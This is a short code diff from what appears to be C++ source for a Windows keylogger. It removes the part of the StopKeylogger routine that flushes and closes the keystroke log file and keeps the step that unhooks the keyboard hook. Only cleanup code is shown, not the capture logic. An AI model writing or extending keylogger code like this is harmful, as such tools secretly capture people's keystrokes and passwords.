@@ -57,15 +57,7 @@ void Keylogger::StopKeylogger() {
         return;
     }
     isKeyloggerRunning = false;
-    if (keylogFile) {
-        fflush(keylogFile);
-        fclose(keylogFile);
-        delete keylogFile;
-        keylogFile = nullptr;
-    }
-    else {
-        std::cerr << "Keylogger file is already closed." << std::endl;
-    }
+
     if (hKeyboardHook) {
         UnhookWindowsHookEx(hKeyboardHook);
         hKeyboardHook = nullptr;
